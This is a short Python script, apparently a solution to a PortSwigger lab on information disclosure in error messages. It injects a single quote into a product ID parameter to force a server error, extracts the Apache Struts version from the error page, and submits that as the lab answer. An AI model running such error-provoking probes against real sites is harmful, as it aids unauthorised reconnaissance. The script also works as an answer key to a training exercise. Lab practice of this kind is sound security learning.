###############################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 2/9/2023
#
# PortSwigger LAB:  Information disclosure in error messages
#
# Steps: 1. Inject a single quote in the product ID parameter to cause an error
#        2. Extract the framework name
#        3. Submit the answer
#
################################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore
import base64

# change this url to your lab
url = "https://0a0900bc042ce79689a248530001003d.web-security-academy.net"

try:
    inject_payload = requests.get(
        f"{url}/product?productId=4'")  # inject the payload
    if inject_payload.status_code == 500:  # if error occur
        print(Fore.WHITE + "1. Injecting the payload.. " + Fore.GREEN + "OK")
        framework_name = re.findall("Apache Struts 2 2.3.31",
                                    inject_payload.text)[0]  # extract the framework name; change this if it's changed in you cases
        print(Fore.WHITE + "2. Extracting the framework name.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + framework_name)
        data = {
            "answer": framework_name
        }
        try:
            submit_answer = requests.post(
                f"{url}/submitsolution", data)  # submit the answer
            if submit_answer.status_code == 200:
                print(Fore.WHITE + "3. Submitting the answer.. " + Fore.GREEN + "OK")
        except:
            print(Fore.RED + "[!] Failed to submit the answer")
except:
    print(Fore.RED + "[!] Failed to inject the payload")
